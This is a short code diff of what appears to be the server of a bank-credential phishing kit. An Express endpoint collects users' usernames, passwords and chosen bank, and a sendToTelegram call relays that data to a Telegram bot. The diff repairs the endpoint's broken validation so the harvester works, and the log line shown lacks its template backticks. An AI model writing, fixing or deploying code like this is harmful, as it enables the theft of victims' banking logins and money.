@@ -204,7 +204,7 @@ await sendToTelegram(`🏦 User selected bank: <b>${bank}</b>`);
 app.post("/api/save", async (req, res) => {
   logRequestData(req);
   const { username, password, bank } = req.body;
-  if (!username  !password  !bank?.name)
+  if (!username || !password || !bank?.name)
     return res.status(400).json({ error: "Missing username, password, or bank info" });
 
   try {
@@ -308,5 +308,6 @@ app.listen(PORT, () => {
   console.log(🚀 Server running on http://localhost:${PORT});
 
 });
+
 
 
